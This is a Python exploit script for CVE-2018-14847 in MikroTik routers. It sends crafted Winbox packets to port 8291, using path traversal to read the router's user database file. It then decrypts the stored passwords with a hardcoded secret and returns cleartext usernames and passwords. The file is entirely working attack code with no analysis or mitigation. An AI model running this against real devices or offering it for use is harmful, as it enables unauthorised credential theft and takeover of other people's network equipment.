# CVE-2018-14847

from socket import socket
from hashlib import md5

class MicroTik:
  hash_secret = b'283i4jfkai3389'

  stage_one = bytearray([
    0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00, 0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
    0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21, 0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
    0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
    0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66, 0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
    0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
    0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
    0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
  ])

  stage_two = bytearray([
    0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00, 0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
    0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08, 0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
    0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
    0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
  ])

  @staticmethod
  def parse_raw_account(raw_account: bytearray):
    raw_username = raw_account.split(b'\x01\x00\x00\x21')[1]
    raw_password = raw_account.split(b'\x11\x00\x00\x21')[1]
    username = raw_username[1:1 + raw_username[0]]
    password = raw_password[1:1 + raw_password[0]]

    key = md5(username + MicroTik.hash_secret).digest()
    cleartext_password = ''
    for index in range(0, len(password)):
      cleartext_password += chr(password[index] ^ key[index % len(key)])

    return username.decode('ascii'), cleartext_password

  @staticmethod
  def dump(data: bytearray):
    accounts = []
    raw_accounts = data.split(b'M2')[1:]
    for raw_account in raw_accounts:
      try:
        accounts.append(MicroTik.parse_raw_account(raw_account))
      except:
        continue
    return accounts

  @staticmethod
  def connect(address: str, port: int, timeout: int):
    sock = socket()
    sock.settimeout(timeout)
    sock.connect((address, port))
    return sock

  @staticmethod
  def exploit(address: str, port: int = 8291, timeout: int = 10, max_read: int = 2048):
    conn = MicroTik.connect(address, port, timeout)
    conn.send(MicroTik.stage_one)

    # Update session ID of the stage two.
    MicroTik.stage_two[19] = bytearray(conn.recv(max_read))[38]

    conn.send(MicroTik.stage_two)

    response = bytearray(conn.recv(max_read))[55:]
    if len(response) <= 24:
      raise Exception('Exploit unsuccesful, response length unsatisfied.')
    
    return MicroTik.dump(response)